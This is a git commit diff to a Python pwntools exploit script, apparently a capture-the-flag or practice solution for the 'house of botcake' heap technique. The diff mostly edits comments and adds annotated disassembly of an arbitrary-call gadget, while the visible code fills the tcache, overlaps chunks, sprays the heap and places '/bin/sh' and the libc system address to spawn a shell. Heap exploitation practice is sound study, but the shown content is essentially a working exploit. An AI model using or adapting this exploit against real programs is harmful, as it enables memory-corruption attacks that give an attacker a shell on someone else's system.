f0d76b73471201dfaa09d4b92467b8bc48ba58e6
pwnpope <108923813+pwnpope@users.noreply.github.com>
2024-03-11 04:35:23 -0400

    Update house_of_botcake.py

--- house_of_botcake.py
+++ house_of_botcake.py
@@ -50,7 +50,7 @@ if __name__ == "__main__":
     for i in range(9):                    # allocate 9 chunks 
         program.add(0x80, i, b"A"*0x80)   # this will be to fill up tcache and get a chunk for consolidation and a victim chunk
 
-    program.add(0x10, 9, b"B"*0x10)       # anti consolidation chunk
+    program.add(0x10, 9, b"B"*0x10)       # anti top chunk consolidation
 
     # cause chunk overlapping
     for i in range(7):                    # free all 7 chunks
@@ -67,7 +67,17 @@ if __name__ == "__main__":
     for i in range(5):                           # heap spray
         program.add(0x80, 0, chr(0x41+i) * 8)    # so that we can get /bin/sh into RDI for system
 
+"""
+00001939  488b45d8           mov     rax, qword [rbp-0x28 {argument_one}]    # the chunk at which our /bin/sh string lives
+0000193d  4883c008           add     rax, 0x8                                # adds 0x8 to RAX so its pointing to the user data
+00001941  488b00             mov     rax, qword [rax]                        # derefrences whats at RAX and moves it back into RAX
+00001944  488b55f0           mov     rdx, qword [rbp-0x10 {address2call}]    # where address hex string is
+
+00001948  4889c7             mov     rdi, rax  # mov RAX into RDI so that we can control arg1 of whatever function we call
+0000194b  ffd2               call    rdx       # this is our arbitrary call where we get to call whatever address is inside of RDX
+0000194d  90                 nop     
+"""
     program.add(0x80, 0, b"/bin/sh")                # /bin/sh into RDI
-    program.add(0x80, 0, hex(libc.sym.system)[2:])  # system into RIP since we can call any address, and we convert it to a hex string to bypass checks
-    io.sendlineafter(b" ",b"42")                    # call the arbitrary call function
+    program.add(0x80, 0, hex(libc.sym.system)[2:])  # send system as a hex string for the arbitrary call
+    io.sendlineafter(b" ",b"42")                    # get shell
     io.interactive()
